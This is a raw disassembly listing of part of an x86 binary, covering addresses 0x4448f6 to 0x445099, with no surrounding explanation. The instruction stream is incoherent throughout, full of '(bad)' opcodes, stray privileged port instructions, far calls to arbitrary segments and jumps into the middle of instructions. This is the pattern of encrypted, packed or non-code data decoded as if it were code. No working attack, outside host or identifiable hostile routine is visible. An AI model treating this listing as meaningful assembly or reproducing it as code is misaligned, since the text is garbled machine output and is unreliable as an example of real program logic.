  4448f6:	adc    dl,BYTE PTR [edi+0x22]
  4448f9:	or     eax,0xef6d0b9a
  4448fe:	pop    eax
  4448ff:	cli    
  444900:	push   ecx
  444901:	fimul  DWORD PTR [ebp+0x4f1ee5ac]
  444907:	popf   
  444908:	mov    dl,0x6a
  44490a:	xchg   BYTE PTR [edi],ch
  44490c:	(bad)  
  44490d:	mov    dh,0x9a
  44490f:	fwait
  444910:	loopne 0x444925
  444912:	mov    dl,0xcb
  444914:	pop    ds
  444915:	std    
  444916:	test   DWORD PTR [edi-0x23fd600f],esp
  44491c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44491d:	pushf  
  44491e:	xor    cl,BYTE PTR [ebx+ecx*8]
  444921:	jbe    0x4448b7
  444923:	dec    esi
  444924:	pusha  
  444925:	fild   QWORD PTR [eax+0x47]
  444928:	inc    edi
  444929:	ja     0x4448f4
  44492b:	pop    ds
  44492c:	adc    eax,0x93d7970b
  444931:	and    al,0x21
  444933:	fiadd  WORD PTR [esi-0x32]
  444936:	xchg   ecx,eax
  444937:	mov    cl,0x36
  444939:	sub    esi,DWORD PTR [eax+eiz*1]
  44493c:	jl     0x44493f
  44493e:	pop    edx
  44493f:	fbld   TBYTE PTR [edx-0x24595104]
  444945:	outs   dx,BYTE PTR ds:[esi]
  444946:	addr16 jp 0x4448ff
  444949:	cmp    ah,BYTE PTR [esi]
  44494b:	push   0x86ac2e32
  444950:	mov    dl,0x4b
  444952:	outs   dx,BYTE PTR ds:[esi]
  444953:	pushf  
  444954:	out    0xb9,al
  444956:	lock push ecx
  444958:	cmp    eax,0x32c83105
  44495d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44495e:	sbb    ah,BYTE PTR [eax+eiz*1-0x4d551974]
  444965:	sbb    ecx,DWORD PTR [ecx]
  444967:	sub    al,0x2b
  444969:	add    dl,BYTE PTR [esi-0xbf42089]
  44496f:	push   ecx
  444970:	int3   
  444971:	push   esi
  444972:	(bad)  
  444973:	repz mov cl,0x3d
  444976:	fs push 0x5297a0bc
  44497c:	outs   dx,DWORD PTR ds:[esi]
  44497d:	jmp    0x444901
  44497f:	dec    edi
  444980:	arpl   WORD PTR [esi+0x1f8da7b4],di
  444986:	into   
  444987:	les    esi,FWORD PTR [ecx+0x127bc19a]
  44498d:	xchg   ebp,eax
  44498e:	cmp    dl,BYTE PTR es:[edi+ebp*8+0x72]
  444993:	ret    0x7eb2
  444996:	xchg   esi,eax
  444997:	mov    bl,0x22
  444999:	iret   
  44499a:	jge    0x4449a5
  44499c:	aam    0xb
  44499e:	sub    al,0xc0
  4449a0:	daa    
  4449a1:	and    BYTE PTR [ebp+0x14],bl
  4449a4:	sub    eax,0xbd359a8f
  4449a9:	pop    edi
  4449aa:	inc    edx
  4449ab:	mov    edx,0x890bc43d
  4449b0:	mov    ah,0x3e
  4449b2:	les    esp,FWORD PTR [ebp+ebx*1+0x2aa2f091]
  4449b9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4449ba:	sti    
  4449bb:	fbld   TBYTE PTR [ebp-0x4d839c4a]
  4449c1:	and    BYTE PTR [edx],dh
  4449c3:	mov    al,0x4c
  4449c5:	push   ebx
  4449c6:	mov    ebp,0xae0157a7
  4449cb:	add    eax,ecx
  4449cd:	dec    eax
  4449ce:	xchg   esp,eax
  4449cf:	adc    BYTE PTR [ebx-0x5367b42b],dh
  4449d5:	(bad)  
  4449d6:	shr    BYTE PTR [eax-0x2171b9a2],1
  4449dc:	pop    es
  4449dd:	or     esi,DWORD PTR [ebx-0x5d08a3f6]
  4449e3:	mov    DWORD PTR [ebp-0x1a],eax
  4449e6:	call   0xfdf4:0x1bf58171
  4449ed:	cmp    al,0x83
  4449ef:	test   al,0x75
  4449f1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4449f2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4449f3:	mov    bh,0x12
  4449f5:	mov    cl,0x26
  4449f7:	jp     0x4449d5
  4449f9:	in     al,0x9a
  4449fb:	add    eax,0x1e4e70ea
  444a00:	fldenv [edi-0xaad7ed2]
  444a06:	sub    ah,BYTE PTR [edi-0xf0d3d5c]
  444a0c:	repz int3 
  444a0e:	call   0xdbd7:0x6e8b6db4
  444a15:	fsubp  st(1),st
  444a17:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  444a18:	out    dx,eax
  444a19:	sar    BYTE PTR [edx],0xe3
  444a1c:	(bad)  
  444a1d:	arpl   WORD PTR [eax],di
  444a1f:	sub    dh,BYTE PTR [edx-0x432ebdba]
  444a25:	je     0x4449d4
  444a27:	adc    al,0xa
  444a29:	or     ecx,DWORD PTR [edx+0x4cfa0b00]
  444a2f:	(bad)  
  444a31:	dec    esp
  444a32:	cmp    bl,BYTE PTR [edi-0x59]
  444a35:	mov    ebp,0xe98d619a
  444a3a:	mov    ebx,0xaa5898d5
  444a3f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  444a40:	repz pop es
  444a42:	in     al,0xc
  444a44:	inc    esi
  444a45:	fisubr DWORD PTR ds:0xfc87b284
  444a4b:	imul   esp,DWORD PTR [eax-0x30],0xffffffa5
  444a4f:	lods   eax,DWORD PTR ds:[esi]
  444a50:	add    al,0x7f
  444a52:	add    DWORD PTR [edi+0x411ef8e0],esp
  444a58:	add    ah,BYTE PTR [esi-0x45ed06f5]
  444a5e:	sbb    al,0x5a
  444a60:	mov    dl,0xab
  444a62:	xchg   edx,ebp
  444a64:	daa    
  444a65:	pop    ebp
  444a66:	lods   al,BYTE PTR ds:[esi]
  444a67:	sbb    DWORD PTR [ecx],ecx
  444a69:	or     edi,edx
  444a6b:	imul   esp,ebp,0xffffffd7
  444a6e:	out    dx,al
  444a6f:	fbstp  TBYTE PTR [edi]
  444a71:	ficomp WORD PTR [ecx+0x95a78e7]
  444a77:	out    dx,al
  444a78:	fsub   st,st(4)
  444a7a:	jge    0x444a4a
  444a7c:	repnz imul BYTE PTR [edi+ebx*4]
  444a80:	mov    al,0x14
  444a82:	or     bl,BYTE PTR ds:0x5cbb8bee
  444a88:	imul   dl
  444a8a:	loop   0x444a3e
  444a8c:	(bad)  
  444a8d:	jb     0x444af0
  444a8f:	mov    al,ds:0xe979afa2
  444a94:	repnz and eax,0xf5180092
  444a9a:	std    
  444a9b:	test   eax,0x4fdc4b7b
  444aa0:	je     0x444ad3
  444aa2:	xlat   BYTE PTR ds:[ebx]
  444aa3:	popa   
  444aa4:	mov    dl,0x81
  444aa6:	xchg   ebx,eax
  444aa7:	iret   
  444aa8:	test   edi,edx
  444aaa:	daa    
  444aab:	cmp    BYTE PTR [edx],cl
  444aad:	jg     0x444a97
  444aaf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  444ab0:	sub    bh,bh
  444ab2:	add    dh,BYTE PTR [eax-0x70]
  444ab5:	outs   dx,BYTE PTR ds:[esi]
  444ab6:	call   0xd0b1:0xd1f436cd
  444abd:	pop    ds
  444abe:	cmp    edi,DWORD PTR [edi]
  444ac0:	or     ebp,DWORD PTR fs:0x2a8efc3c
  444ac7:	mov    ?,WORD PTR [esi-0x40256436]
  444acd:	xchg   DWORD PTR [ebx+0x42be4462],edi
  444ad3:	push   cs
  444ad4:	jl     0x444ae1
  444ad6:	cli    
  444ad7:	jp     0x444ae3
  444ad9:	leave  
  444ada:	loop   0x444b3c
  444adc:	test   eax,0x518a9930
  444ae1:	test   DWORD PTR [esi],edi
  444ae3:	mov    ebp,0x7f439878
  444ae8:	enter  0x8ebd,0xa6
  444aec:	pop    edx
  444aed:	std    
  444aee:	jle    0x444a86
  444af0:	out    dx,eax
  444af1:	rcr    BYTE PTR [ebx+0x4e],1
  444af4:	stc    
  444af5:	fisttp DWORD PTR [esi+0xf]
  444af8:	(bad)  
  444af9:	cli    
  444afa:	adc    BYTE PTR [esi-0x49607770],ah
  444b00:	jo     0x444add
  444b02:	cli    
  444b03:	inc    eax
  444b04:	ja     0x444b2d
  444b06:	ss repnz fwait
  444b09:	or     al,0xc4
  444b0b:	jp     0x444aa6
  444b0d:	(bad)  [esi]
  444b0f:	mov    bh,0xc3
  444b11:	xchg   edx,eax
  444b12:	fwait
  444b13:	les    ecx,FWORD PTR [eax-0x5e]
  444b16:	lods   al,BYTE PTR ds:[esi]
  444b17:	and    eax,0x33629b20
  444b1c:	mov    BYTE PTR [ebx],cl
  444b1e:	xor    DWORD PTR ds:0x67fd24df,ebp
  444b24:	iret   
  444b25:	cmp    al,0x9d
  444b27:	ret    
  444b28:	mov    ebp,0x1b952adc
  444b2d:	or     edi,DWORD PTR [edx]
  444b2f:	dec    ecx
  444b30:	xor    al,0x77
  444b32:	mov    edi,0x1acd129f
  444b37:	sub    DWORD PTR [ebp+0x20b17edb],0xffffff92
  444b3e:	rcl    BYTE PTR [edi+0x67],cl
  444b41:	or     ecx,DWORD PTR [esi]
  444b43:	pop    edi
  444b44:	call   0x380b:0xc57bc9b2
  444b4b:	mov    al,0x12
  444b4d:	pop    ecx
  444b4e:	mov    al,0x82
  444b50:	xlat   BYTE PTR ds:[ebx]
  444b51:	jmp    0x1b76bf0
  444b56:	xor    BYTE PTR [esi-0x58ca267e],bh
  444b5c:	repnz out 0x0,al
  444b5f:	stc    
  444b60:	jnp    0x444b09
  444b62:	inc    esp
  444b63:	repz mov dl,0x89
  444b66:	or     ch,BYTE PTR [esi+0x6a68c34f]
  444b6c:	pop    esp
  444b6d:	add    DWORD PTR [edi],ebx
  444b6f:	fmul   st,st(1)
  444b71:	adc    eax,0xfbcaa732
  444b76:	dec    edx
  444b77:	xchg   edx,eax
  444b78:	cli    
  444b79:	push   esp
  444b7a:	call   0xff15:0x61fce911
  444b81:	clc    
  444b82:	push   edx
  444b83:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  444b84:	stos   BYTE PTR es:[edi],al
  444b85:	mov    ds:0x6fef75bb,al
  444b8a:	sbb    bl,BYTE PTR [eax]
  444b8c:	mov    al,ds:0xbdb4beb7
  444b91:	neg    DWORD PTR [ebp+eax*4+0x1d]
  444b95:	mov    BYTE PTR [esi],al
  444b97:	and    DWORD PTR [ebx+0x4ad61783],esi
  444b9d:	mov    bl,0x16
  444b9f:	lahf   
  444ba0:	ins    BYTE PTR es:[edi],dx
  444ba1:	jae    0x444b3d
  444ba3:	inc    eax
  444ba4:	mov    ah,0x2a
  444ba6:	clc    
  444ba7:	repz jnp 0x444b8f
  444baa:	call   0x99b2:0x6a5d6a4f
  444bb1:	xchg   esp,eax
  444bb2:	cmp    eax,0xa1de22a7
  444bb7:	repnz inc esi
  444bb9:	mov    ecx,edx
  444bbb:	aas    
  444bbc:	mov    cl,0xe6
  444bbe:	inc    ecx
  444bbf:	sar    esp,0x7
  444bc2:	test   eax,0x62d3050e
  444bc7:	add    ah,ah
  444bc9:	or     ebx,esi
  444bcb:	nop
  444bcc:	sti    
  444bcd:	jae    0x444bab
  444bcf:	xchg   edx,eax
  444bd0:	fisub  WORD PTR ds:0xfae940b6
  444bd6:	call   0xd394:0x7b36f066
  444bdd:	or     ecx,DWORD PTR [eax]
  444bdf:	mov    eax,cs
  444be1:	xor    DWORD PTR ds:0xa0f469cc,esi
  444be7:	or     ch,BYTE PTR [ecx]
  444be9:	mov    al,BYTE PTR ds:0xc944ddb6
  444bef:	mov    cl,BYTE PTR [edx-0x77]
  444bf2:	dec    ebp
  444bf3:	mov    ds:0x50be97c9,al
  444bf8:	mov    ebp,DWORD PTR [si]
  444bfb:	bnd jno 0x444c22
  444bfe:	call   0xf60f:0x1ecc355d
  444c05:	repnz pop ss
  444c07:	out    dx,eax
  444c08:	adc    ebx,DWORD PTR gs:[ebp+0x89c71a]
  444c0f:	ja     0x444c83
  444c11:	xor    BYTE PTR [ecx+0x21],dl
  444c14:	mov    bl,0x23
  444c16:	sub    BYTE PTR [edx+0x29],al
  444c19:	out    0x7,eax
  444c1b:	fist   WORD PTR [edx+0x16]
  444c1e:	adc    esp,DWORD PTR [edi+0x32e14d3c]
  444c24:	dec    ebp
  444c25:	xchg   ebx,eax
  444c26:	xor    al,0xe0
  444c28:	mov    dl,0x64
  444c2a:	xor    DWORD PTR [edx-0x74],0x4b
  444c2e:	ret    
  444c2f:	cmc    
  444c30:	and    ecx,DWORD PTR [ebx]
  444c32:	dec    ebx
  444c33:	addr16 push 0x1e
  444c36:	sti    
  444c37:	lds    edi,FWORD PTR [edi-0x20]
  444c3a:	call   0x5273:0xc1855433
  444c41:	and    esi,edx
  444c43:	rol    dl,1
  444c45:	adc    al,0xb8
  444c47:	ror    BYTE PTR [edi-0x42e4af75],0x88
  444c4e:	add    cl,BYTE PTR [ebx]
  444c50:	mov    dl,0xa3
  444c52:	cld    
  444c53:	call   0x44dda975
  444c58:	or     DWORD PTR [ebx],ecx
  444c5a:	repz jns 0x444cbe
  444c5d:	addr16 js 0x444cb6
  444c60:	inc    esi
  444c61:	ds call 0xabaa:0x4f65c6c5
  444c69:	pop    esi
  444c6a:	inc    ecx
  444c6b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  444c6c:	pop    ecx
  444c6d:	adc    DWORD PTR [ecx-0x6a558cdb],edi
  444c73:	(bad)  
  444c74:	mov    dl,0xdd
  444c76:	out    0x78,al
  444c78:	jge    0x444c2f
  444c7a:	aad    0x7b
  444c7c:	mov    edi,0xd6a0880b
  444c81:	psubw  mm3,QWORD PTR [ecx+0x49]
  444c85:	pop    ecx
  444c86:	cdq    
  444c87:	aas    
  444c88:	outs   dx,DWORD PTR ds:[esi]
  444c89:	and    eax,DWORD PTR [esi+esi*2+0x7029f371]
  444c90:	rol    DWORD PTR ds:0x36aefee0,0x9a
  444c97:	mov    ebp,0x5f47cbb4
  444c9c:	mov    dl,0xa9
  444c9e:	cmp    al,0xc6
  444ca0:	jge    0x444c93
  444ca2:	fidivr DWORD PTR cs:[ecx+0xb703f08]
  444ca9:	push   ecx
  444caa:	mov    ch,0x99
  444cac:	xor    DWORD PTR [esi+0x7a],esp
  444caf:	inc    ebx
  444cb0:	jbe    0x444cf9
  444cb2:	fwait
  444cb3:	ret    0x7d68
  444cb6:	jmp    0x85e7:0x6a41fd02
  444cbd:	or     esi,edx
  444cbf:	jl     0x444c54
  444cc1:	aad    0x6e
  444cc3:	scas   eax,DWORD PTR es:[edi]
  444cc4:	sti    
  444cc5:	out    0xc2,eax
  444cc7:	cmp    ecx,edx
  444cc9:	pop    ss
  444cca:	push   edi
  444ccb:	(bad)  [edx+0x12950083]
  444cd1:	fcomp  st(1)
  444cd3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  444cd4:	lahf   
  444cd5:	push   ebp
  444cd6:	mov    edx,0xa584b063
  444cdb:	fisttp WORD PTR [eax+0x50297cba]
  444ce1:	lahf   
  444ce2:	push   es
  444ce3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  444ce4:	loope  0x444c87
  444ce6:	cmp    al,0x24
  444ce8:	pushf  
  444ce9:	jno    0x444c70
  444ceb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  444cec:	or     DWORD PTR [ebp+0x42],edx
  444cef:	call   0xe902:0xc9dafe40
  444cf6:	jb     0x444c9f
  444cf8:	adc    edx,DWORD PTR [ebx-0x62]
  444cfb:	jp     0x444d38
  444cfd:	xchg   esi,eax
  444cfe:	ja     0x444d66
  444d00:	scas   eax,DWORD PTR es:[edi]
  444d01:	int3   
  444d02:	jecxz  0x444d31
  444d04:	cmc    
  444d05:	test   ebp,edi
  444d07:	inc    BYTE PTR [edx-0x2d]
  444d0a:	bound  edx,QWORD PTR [edx+0x3bc50b01]
  444d10:	sbb    al,0x8f
  444d12:	stc    
  444d13:	sbb    bl,BYTE PTR [ecx+0x13]
  444d16:	call   0x23bd:0x5afc0947
  444d1d:	je     0x444d2c
  444d1f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  444d20:	test   ebx,edi
  444d22:	dec    esp
  444d23:	cmp    BYTE PTR [ebx-0x75853869],dl
  444d29:	hlt    
  444d2a:	daa    
  444d2b:	daa    
  444d2c:	loope  0x444d97
  444d2e:	scas   al,BYTE PTR es:[edi]
  444d2f:	je     0x444cf6
  444d31:	std    
  444d32:	push   cs
  444d33:	scas   al,BYTE PTR es:[edi]
  444d34:	jnp    0x444d39
  444d36:	inc    ebp
  444d37:	call   0x11fcc9ee
  444d3c:	push   ds
  444d3d:	and    BYTE PTR [esi+0x110bbf48],0x18
  444d44:	lock push ss
  444d46:	out    dx,eax
  444d47:	sbb    eax,0x861f17b7
  444d4c:	xchg   ebp,eax
  444d4d:	retf   
  444d4e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  444d4f:	adc    edx,DWORD PTR ds:0xb2436529
  444d55:	dec    edi
  444d56:	jmpw   0x7cb3
  444d5a:	xor    ch,BYTE PTR [ebx-0xa6ceb24]
  444d60:	test   ebx,ecx
  444d62:	push   ss
  444d63:	push   ss
  444d64:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  444d65:	sbb    edx,esi
  444d67:	js     0x444d1b
  444d69:	fadd   QWORD PTR [edi-0x7debb3b8]
  444d6f:	out    0x73,eax
  444d71:	push   edi
  444d72:	xchg   edi,eax
  444d73:	in     eax,0x8f
  444d75:	mov    esi,0xc691ca98
  444d7a:	mov    esp,0x55cef2fb
  444d7f:	push   esi
  444d80:	mov    dl,0x93
  444d82:	jnp    0x444d4b
  444d84:	jo     0x444d7d
  444d86:	pop    ebx
  444d87:	lock xor BYTE PTR [ecx+ecx*8],dl
  444d8b:	xor    al,0xa1
  444d8d:	dec    edx
  444d8e:	inc    ebx
  444d8f:	or     eax,0x73daaf90
  444d94:	xchg   ebx,eax
  444d95:	fs call 0x1037:0xa63dd439
  444d9d:	hlt    
  444d9e:	add    eax,0x9c8c6ea3
  444da3:	call   0x63c1197f
  444da8:	xchg   edi,eax
  444da9:	sub    eax,0x950b219a
  444dae:	sbb    al,cl
  444db0:	or     eax,0x51a74a36
  444db5:	popa   
  444db6:	nop
  444db7:	xchg   esp,eax
  444db8:	in     al,dx
  444db9:	xchg   ebx,eax
  444dba:	pusha  
  444dbb:	ret    
  444dbc:	mov    bl,0xdf
  444dbe:	cmp    al,0x54
  444dc0:	mov    edi,DWORD PTR [edx-0x73]
  444dc3:	cli    
  444dc4:	ret    0x61da
  444dc7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  444dc8:	mov    BYTE PTR [ebx+0x5e5823f],bl
  444dce:	mov    eax,fs
  444dd0:	mov    dl,0xf2
  444dd2:	aaa    
  444dd3:	enter  0x26ad,0xd4
  444dd7:	ja     0x444e4b
  444dd9:	or     al,0x76
  444ddb:	sub    edx,DWORD PTR [ecx+0x2d]
  444dde:	loopne 0x444dc7
  444de0:	mov    al,ds:0xaecb20d2
  444de5:	pusha  
  444de6:	mov    es,WORD PTR [ecx]
  444de8:	jb     0x444e36
  444dea:	push   ecx
  444deb:	fucompp 
  444ded:	bound  edi,QWORD PTR [eax-0x68]
  444df0:	dec    ebp
  444df1:	loopne 0x444e0d
  444df3:	je     0x444d7f
  444df5:	sub    ch,BYTE PTR [eax+esi*8+0x429090ef]
  444dfc:	push   ecx
  444dfd:	cmc    
  444dfe:	outs   dx,BYTE PTR ds:[esi]
  444dff:	and    al,0xb2
  444e01:	mov    ch,BYTE PTR [ebx-0x59dbb22f]
  444e07:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  444e08:	ret    
  444e09:	daa    
  444e0a:	mov    edi,0x948145a4
  444e0f:	xor    dh,BYTE PTR [edx+0x4ae8b84c]
  444e15:	cmp    edx,DWORD PTR [ebx*4-0x5803046b]
  444e1c:	scas   al,BYTE PTR es:[edi]
  444e1d:	vmulss xmm0,xmm3,xmm2
  444e21:	addr16 retf 0xb2eb
  444e25:	lea    edx,[ebp+0x4f]
  444e28:	pushf  
  444e29:	aas    
  444e2a:	aad    0xf2
  444e2c:	dec    ebx
  444e2d:	or     ecx,DWORD PTR [ebp+edi*8-0x46]
  444e31:	out    dx,al
  444e32:	sahf   
  444e33:	xchg   ebp,eax
  444e34:	push   ss
  444e35:	cmp    ebx,DWORD PTR [edi-0x703e1029]
  444e3b:	ins    BYTE PTR es:[edi],dx
  444e3c:	mov    dl,0xab
  444e3e:	mov    ah,0x80
  444e40:	push   0xffffffc2
  444e42:	out    dx,al
  444e43:	fwait
  444e44:	jg     0x444e20
  444e46:	sbb    dl,ah
  444e48:	scas   al,BYTE PTR es:[edi]
  444e49:	or     DWORD PTR [eax],edx
  444e4b:	(bad)  
  444e4c:	out    0x58,eax
  444e4e:	call   0x9012:0xd7fd9872
  444e55:	rcr    DWORD PTR [edi+eiz*4-0x66],0xae
  444e5a:	jno    0x444e5c
  444e5c:	out    dx,al
  444e5d:	in     eax,dx
  444e5e:	fstp   QWORD PTR [edx]
  444e60:	mov    dl,0x5
  444e62:	xor    bh,BYTE PTR [esi-0x47ba0d43]
  444e68:	mov    ?,WORD PTR [edi+0x40]
  444e6b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  444e6c:	cli    
  444e6d:	sub    BYTE PTR [ebx+eax*1-0x80],ah
  444e71:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  444e72:	push   0x95065a67
  444e77:	dec    edx
  444e78:	add    edi,DWORD PTR [esi+edi*8+0x8]
  444e7c:	shl    bh,0x9d
  444e7f:	jmp    DWORD PTR [esi+edx*2]
  444e82:	cli    
  444e83:	adc    al,0x8f
  444e85:	cmp    eax,0xd31a9f3f
  444e8a:	sbb    bl,ah
  444e8c:	adc    DWORD PTR [ecx-0xd],edx
  444e8f:	pop    edi
  444e90:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  444e91:	int3   
  444e92:	xchg   ecx,eax
  444e93:	cmp    dl,BYTE PTR [eax+0x18a7bad9]
  444e99:	pop    ebp
  444e9a:	scas   al,BYTE PTR es:[edi]
  444e9b:	xchg   edx,eax
  444e9c:	sub    BYTE PTR [ebx],cl
  444e9e:	or     al,0x56
  444ea0:	xor    eax,0xfcb285c8
  444ea5:	push   ss
  444ea6:	test   esp,ebp
  444ea8:	leave  
  444ea9:	sbb    cl,0x2a
  444eac:	push   esi
  444ead:	test   al,0x33
  444eaf:	pop    edi
  444eb0:	ret    0xfe41
  444eb3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  444eb4:	add    eax,0xf40f4f6e
  444eb9:	jp     0x444e3f
  444ebb:	xor    BYTE PTR [ecx-0x31c342fb],dh
  444ec1:	aad    0xd2
  444ec3:	pop    ss
  444ec4:	scas   al,BYTE PTR es:[edi]
  444ec5:	add    al,0x87
  444ec7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  444ec8:	cmp    BYTE PTR [ecx+0x3c],dh
  444ecb:	loopne 0x444e6e
  444ecd:	inc    esp
  444ece:	scas   eax,DWORD PTR es:[edi]
  444ecf:	shl    BYTE PTR [edx-0x1bee58c1],cl
  444ed5:	pop    es
  444ed6:	push   ss
  444ed7:	clc    
  444ed8:	mov    ebx,0x7139b00b
  444edd:	push   edi
  444ede:	mov    dl,0x6d
  444ee0:	(bad)  
  444ee1:	rcr    BYTE PTR [edx-0x6a690d2f],cl
  444ee7:	sbb    esi,DWORD PTR [eax]
  444ee9:	add    eax,0x75e0bf14
  444eee:	or     al,0x7
  444ef0:	aaa    
  444ef1:	push   ebx
  444ef2:	mov    ds:0xaa8bd2fa,eax
  444ef7:	and    BYTE PTR [eax+0x4a4cf26e],bl
  444efd:	push   ss
  444efe:	cld    
  444eff:	mov    bl,0xa
  444f01:	retf   
  444f02:	mov    al,ds:0xef86a87e
  444f07:	jns    0x444eb8
  444f09:	mov    edi,0xcc75e21a
  444f0e:	pusha  
  444f0f:	or     eax,0x57fce562
  444f14:	arpl   WORD PTR [esi],dx
  444f16:	rcr    DWORD PTR [ebx],0x50
  444f19:	dec    ebx
  444f1a:	xchg   edx,eax
  444f1b:	mov    bh,0x1c
  444f1d:	data16 adc cl,BYTE PTR [edi-0x4e]
  444f21:	pop    ebp
  444f22:	aaa    
  444f23:	xor    DWORD PTR [ecx+0x3d93aa73],0x776d8217
  444f2d:	mov    al,0x1a
  444f2f:	xor    esp,DWORD PTR [edx]
  444f31:	and    eax,0xff07e74
  444f36:	xchg   ebp,eax
  444f37:	ror    DWORD PTR ds:0xedc71357,0x88
  444f3e:	test   eax,0xd10b024e
  444f43:	fwait
  444f44:	sbb    BYTE PTR ds:0x2b2cc539,bl
  444f4a:	popf   
  444f4b:	mov    eax,0xf618f454
  444f50:	xor    al,0x63
  444f53:	sub    DWORD PTR [edi+0xa],ecx
  444f56:	push   esi
  444f57:	imul   esi,esp,0x43d32024
  444f5d:	in     al,dx
  444f5e:	jp     0x444ee1
  444f60:	pop    esi
  444f61:	pop    esp
  444f62:	lahf   
  444f63:	cwde   
  444f64:	mov    DWORD PTR [esi+0x5632fa9c],eax
  444f6a:	inc    eax
  444f6b:	xor    BYTE PTR gs:0xec00795c,al
  444f72:	adc    al,0xac
  444f74:	push   edx
  444f75:	lahf   
  444f76:	inc    ecx
  444f77:	add    ebx,DWORD PTR [ebx]
  444f79:	push   edx
  444f7a:	call   0xe43f:0x52b54e28
  444f81:	push   0x35
  444f83:	dec    ebp
  444f84:	pop    ss
  444f85:	or     edi,DWORD PTR [ecx]
  444f87:	js     0x444fdc
  444f89:	ret    0xca09
  444f8c:	push   ds
  444f8d:	sub    BYTE PTR [esi+0x1a249540],al
  444f93:	fisttp QWORD PTR [ebp+0x3b]
  444f96:	adc    ebp,DWORD PTR [ebx+edi*4]
  444f99:	or     edx,DWORD PTR [edi+0x3ac40f43]
  444f9f:	lahf   
  444fa0:	stos   DWORD PTR es:[edi],eax
  444fa1:	mov    bl,0x9a
  444fa3:	mov    al,ds:0xeb68a3f3
  444fa8:	jg     0x444ff5
  444faa:	aas    
  444fab:	mov    ah,0xe4
  444fad:	pop    edx
  444fae:	inc    edx
  444faf:	addr16 dec edx
  444fb1:	fild   DWORD PTR [ebx+0x53]
  444fb4:	mov    dl,0xe
  444fb6:	(bad)  
  444fb7:	(bad)  
  444fb8:	out    0xcb,eax
  444fba:	adc    ch,0xf3
  444fbd:	or     al,0x8a
  444fbf:	xchg   edi,eax
  444fc0:	retf   
  444fc1:	aam    0xbf
  444fc3:	dec    ecx
  444fc4:	jb     0x444f94
  444fc6:	inc    ebx
  444fc7:	inc    esi
  444fc8:	cmp    DWORD PTR [ebp-0x66],ecx
  444fcb:	test   BYTE PTR [ebx+0x5f6f2a9b],ah
  444fd1:	out    dx,eax
  444fd2:	ins    BYTE PTR es:[edi],dx
  444fd3:	(bad)  
  444fd5:	or     edx,DWORD PTR [ebx]
  444fd7:	sbb    esp,DWORD PTR [edi-0x38]
  444fda:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  444fdb:	jecxz  0x44504b
  444fdd:	mov    ah,0x9a
  444fdf:	test   DWORD PTR [ebp-0x429d3e18],esp
  444fe5:	imul   edi,DWORD PTR ds:0xe0a11fa4,0xa5b54ac
  444fef:	fisub  WORD PTR [edx-0x204665f7]
  444ff5:	stos   DWORD PTR es:[edi],eax
  444ff6:	and    DWORD PTR [ebp-0x1],0x59
  444ffa:	mov    esp,DWORD PTR [edi-0x7861db9a]
  445000:	sti    
  445001:	push   es
  445002:	xor    BYTE PTR [ebx+0x7086d7b2],ch
  445008:	pop    esi
  445009:	xor    bh,dl
  44500b:	mov    DWORD PTR [ecx+0xb],ebp
  44500e:	lods   al,BYTE PTR ds:[esi]
  44500f:	jb     0x444fdc
  445011:	inc    ebx
  445012:	push   ebp
  445013:	idiv   ebp
  445015:	mov    bl,0xfa
  445017:	int    0x7e
  445019:	adc    al,0x18
  44501b:	push   esp
  44501c:	mov    ebx,0x75c3bb0b
  445021:	ja     0x44504d
  445023:	mov    ah,0xe4
  445025:	test   al,0x89
  445027:	dec    BYTE PTR [ecx+0xa]
  44502a:	call   0x5384:0x4bb50f27
  445031:	or     ecx,DWORD PTR [ebx]
  445033:	pop    edx
  445034:	and    BYTE PTR [eax+0x6d877154],dl
  44503a:	call   0xdf7e:0xbfabd514
  445041:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  445042:	push   cs
  445043:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  445044:	daa    
  445045:	fadd   QWORD PTR [esi+edx*2-0x1dc9e4cc]
  44504c:	mov    dl,0x6d
  44504e:	fild   DWORD PTR [esi+eax*2]
  445051:	pop    esp
  445052:	sbb    eax,DWORD PTR [ecx-0x19]
  445055:	jne    0x444ff4
  445057:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  445058:	sbb    BYTE PTR [edi+0xfa4b994],dh
  44505e:	stos   BYTE PTR es:[edi],al
  44505f:	push   es
  445060:	ret    0x9da3
  445063:	fnstenv [eax-0xd51a978]
  445069:	imul   esp,DWORD PTR [esi+0x181cdaf3],0xffffff81
  445070:	cmp    DWORD PTR [ecx],eax
  445072:	call   0x605f34
  445077:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  445078:	fistp  QWORD PTR [eax+0x4f43eb9e]
  44507e:	mov    eax,ds:0x9a23f24b
  445083:	popf   
  445084:	xchg   edi,eax
  445085:	nop
  445086:	mov    bh,0xc6
  445088:	xchg   edx,eax
  445089:	outs   dx,BYTE PTR ds:[esi]
  44508a:	jmp    0x445031
  44508c:	mov    al,ds:0x76e2831a
  445091:	in     eax,dx
  445092:	cli    
  445093:	sub    eax,0xe5e5a19c
  445098:	scas   eax,DWORD PTR es:[edi]
  445099:	push   ds
